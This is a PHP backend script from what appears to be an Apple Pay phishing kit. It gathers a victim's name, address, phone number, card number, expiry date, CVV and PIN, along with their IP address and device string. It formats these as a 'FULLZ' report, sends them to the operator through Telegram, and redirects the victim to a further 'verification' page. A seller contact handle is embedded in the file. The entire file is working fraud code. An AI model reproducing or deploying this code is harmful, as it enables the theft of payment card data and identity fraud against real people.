<?php
error_reporting(0);


require 'settings/config.php';
require './telegram.php';
require 'lib/page-functions.php';

store_post_values($_POST);

session_start();

$firstName = $_SESSION["fullname"];
$line1 = $_SESSION["address1"];
$line2 = $_SESSION["address2"];
$zipcode = $_SESSION["zipcode"];
$phonenumber = $_SESSION["phonenumber"];
$cardnumber = $_POST["cardnumber"];
$expirydate = $_POST["expirydate"];
$cvv = $_POST["cvv"];
$pin = $_POST["pin"];

$ip = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"];

$ip = $_SERVER["REMOTE_ADDR"];

$subject = "APPLE PAY | $ip | $ua";

$fsh =
        "<strong>‼ ️💳 APPLE PAY FULLZ 💳 ‼️</strong>\n".
		"-----Personal Details-----\n".
		"| Full Name : <code>$firstName</code> \n".
		"| Address (1): <code>$line1</code> \n".
		"| Address (2): <code>$line2</code> \n".
		"| Zip Code: <code>$zipcode</code> \n".
		"| Phone Number: <code>$phonenumber</code> \n".
		"<strong>-----Card Details-----</strong>\n".
		"| Card Number : <code>$cardnumber</code>\n".
		"| Expiry Date : <code>$expirydate</code>\n".
		"| CVV : <code>$cvv</code>\n".
		"| Pin : <code>$pin</code>\n".
		"+-----Victim Details-----+\n".
		"| 🌐 IP : $ip\n".
		"| Device : $ua\n".
		"|----Contact Me IF YOU NEED HELP : @ro0tM8n ----\n"
        ;


telegram($fsh);

save_as_text($txt);
header("Location: ./verification.php");
?>
